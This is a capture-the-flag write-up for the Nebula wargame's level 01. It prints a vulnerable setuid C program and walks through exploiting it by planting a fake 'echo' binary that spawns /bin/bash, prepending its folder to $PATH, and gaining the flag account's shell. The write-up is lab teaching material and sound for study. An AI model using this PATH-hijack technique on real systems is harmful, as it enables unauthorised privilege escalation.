---
layout: default
title: "Nebula01"
tags: Nebula
description: "Writing a simple binary to exploit the application via $PATH variable"
---


## Level 01

> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it? To do this level, log in as the `level01` account with the password `level01`. Files for this level can be found in the `/home/flag01` directory.

### Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

## Getting the flag

First, let's login via `ssh` and check the binary at `/home/flag01`. 

```
level01@nebula:/home/flag01$ ./flag01 
and now what?
```

From the quick audit of the source code, we can see that `echo` is called by the relative path instead of the absolute one (`echo` instead of `/bin/echo`). We can abuse that and create another binary named `echo` in another location and add it to the `$PATH`, so Linux will prioritize our "malicious" binary instead of the right one. 

Let's create a new folder in `/tmp` and write a simple program there:

```
flag01@nebula:~$ cd /tmp
flag01@nebula:/tmp$ mkdir level01 && cd level01
flag01@nebula:/tmp/level01$ nano echo.c
```

Our `echo` will simply call the `/bin/bash`. It could be anything, really, but I prefer to spawn a shell if I have a chance to do so.

```
#include<stdio.h>

int main()
{
  system("/bin/bash");
}
```

Compile that program with `gcc` 

```
flag01@nebula:/tmp/level01$ gcc echo.c -o echo
```

Let's check the content of the `$PATH` variable:

```
flag01@nebula:/tmp/level01$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

We can add our folder with the binary to the global `$PATH`:

```
flag01@nebula:/tmp/level01$ PATH=/tmp/level01:$PATH

flag01@nebula:/tmp/level01$ echo $PATH
/tmp/level01:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

Alright, now when we will execute the binary in the `/home/flag01` it will call our `echo` and spawn a shell:

```
flag01@nebula:/tmp/level01$ /home/flag01/flag01 
flag01@nebula:/tmp/level01$ getflag 
You have successfully executed getflag on a target account
```

## Other Nebula levels 
- [level00](https://hackish.space/Nebula-level00)
- [level01](https://hackish.space/Nebula-level01)
- [level02](https://hackish.space/Nebula-level02)
- [level03](https://hackish.space/Nebula-level03)
- [level04](https://hackish.space/Nebula-level04)
- [level05](https://hackish.space/Nebula-level05)
- [level06](https://hackish.space/Nebula-level06)
- [level07](https://hackish.space/Nebula-level07)
- [level08](https://hackish.space/Nebula-level08)
- [level09](https://hackish.space/Nebula-level09)
- [level10](https://hackish.space/Nebula-level10)
- [level11](https://hackish.space/Nebula-level11)
- [level12](https://hackish.space/Nebula-level12)
- [level13](https://hackish.space/Nebula-level13)
- [level14](https://hackish.space/Nebula-level14)
- [level15](https://hackish.space/Nebula-level15)
- [level16](https://hackish.space/Nebula-level16)
- [level17](https://hackish.space/Nebula-level17)
- [level18](https://hackish.space/Nebula-level18)
- [level19](https://hackish.space/Nebula-level19)